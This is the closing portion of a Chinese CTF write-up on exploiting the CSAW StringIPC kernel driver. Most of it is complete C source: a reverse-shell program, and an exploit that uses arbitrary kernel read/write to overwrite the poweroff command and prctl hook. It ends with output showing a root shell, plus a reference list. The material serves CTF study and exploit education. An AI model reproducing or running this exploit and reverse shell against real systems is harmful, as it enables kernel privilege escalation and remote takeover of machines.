    #include 
    int main(int argc,char *argv[])
    {
        int sockfd,numbytes;
        char buf[BUFSIZ];
        struct sockaddr_in their_addr;
        while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1);
        their_addr.sin_family = AF_INET;
        their_addr.sin_port = htons(2333);
        their_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
        bzero(&(their_addr.sin_zero), 8);
        while(connect(sockfd,(struct sockaddr*)&their_addr,sizeof(struct sockaddr)) == -1);
        dup2(sockfd,0);
        dup2(sockfd,1);
        dup2(sockfd,2);
        system("/bin/sh");
        return 0;
    }
pwn_hijackprctl.c
    #include 
    #include        
    #include 
    #include 
    #include 
    #include 
    #include  
    #define CSAW_IOCTL_BASE     0x77617363
    #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
    #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
    #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
    #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
    #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
    #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
    #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
    #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
    struct alloc_channel_args {
        size_t buf_size;
        int id;
    };
    struct open_channel_args {
        int id;
    };
    struct shrink_channel_args {
        int id;
        size_t size;
    };
    struct read_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    struct write_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    struct seek_channel_args {
        int id;
        loff_t index;
        int whence;
    };
    struct close_channel_args {
        int id;
    };
    void print_hex(char *buf,size_t len){
        int i ;
        for(i = 0;i "/reverse_shll\0"
        memset(buf,'\0',0x1000);
        //*(size_t *)buf = selinux_disable_addr;
        strcpy(buf,"/reverse_shell\0");
        //strcpy(buf,"/bin/chmod 777 /flag\0");
        seek_args.id =  alloc_args.id;
        seek_args.index = order_cmd-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = strlen(buf);
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
        memset(buf,'\0',0x1000);
        seek_args.id =  alloc_args.id;
        seek_args.index = order_cmd+14-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = 1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
    /*
        memset(buf,'\0',0x1000);
        *(size_t *)buf = 1 ;
        //strcpy(buf,"/bin//sh\0");
        seek_args.id =  alloc_args.id;
        seek_args.index = kernel_base +  0x1380118-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = 20+1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);   
    */
        // change *prctl_hook -> reboot_work_func_addr
        memset(buf,'\0',0x1000);
        *(size_t *)buf = poweroff_work_func_addr;
        seek_args.id =  alloc_args.id;
        seek_args.index = prctl_hook-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = 20+1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);   
    // trag and get reverse shell
        if(fork() == 0 ){
            prctl(addr,2, addr,addr,2);
            exit(-1);
        }
        system("nc -l -p 2333");
        return 0;
    }
最终可以拿到root权限的反弹shell
    $ ./pwn
    [+] now we get a channel 1
    [+] we can read and write any momery
    [+] found vdso ffffffff81e04000
    [+] found kernel base: ffffffff81000000
    [+] found prctl_hook: ffffffff81eb7df8
    [+] found order_cmd : ffffffff81e4dfa0
    [+] found selinux_disable_addr : ffffffff81351c80
    [+] found poweroff_work_func_addr: ffffffff810a39c0
    id
    uid=0(root) gid=0(root)
最后感谢simp1e师傅的帮助，学到了很多东西。本篇被我同步到了[我的blog](http://p4nda.top/2018/11/07/stringipc/)
# 参考
强网杯出题思路-solid_core:
Bypassing SMEP Using vDSO
Overwrites：
linux kernel pwn notes: 
idr 机制：
给shellcode找块福地－通过VDSO绕过PXN:
New Reliable Android Kernel Root Exploitation Techniques：